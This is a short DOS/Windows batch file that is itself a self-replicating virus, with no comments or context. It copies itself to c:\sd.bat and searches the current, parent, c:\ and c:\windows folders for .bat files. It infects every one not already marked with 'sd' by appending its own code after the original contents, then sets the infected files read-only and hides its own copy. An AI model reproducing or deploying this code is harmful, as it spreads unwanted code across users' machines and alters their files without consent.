@echo off
if %2==sd_inf goto sd_inf
if not exist c:\sd.bat copy sd.bat c:\ >nul
if not exist c:\sd.bat copy %0.bat c:\sd.bat >nul
for %%a in (..\*.bat *.bat c:\*.bat c:\windows\*.bat) do call %0 %%a sd_inf
goto fin
:sd_inf
find "sd"<%1>nul
if not errorlevel 1 goto fin

type %1>bakk.bak
echo @echo off>%1
echo if %%2==sd_inf goto sd_inf>>%1
echo cls>>%1
type bakk.bak>>%1
type c:\sd.bat>>%1
attrib %1 +r
:fin
attrib c:\sd.bat +h +r
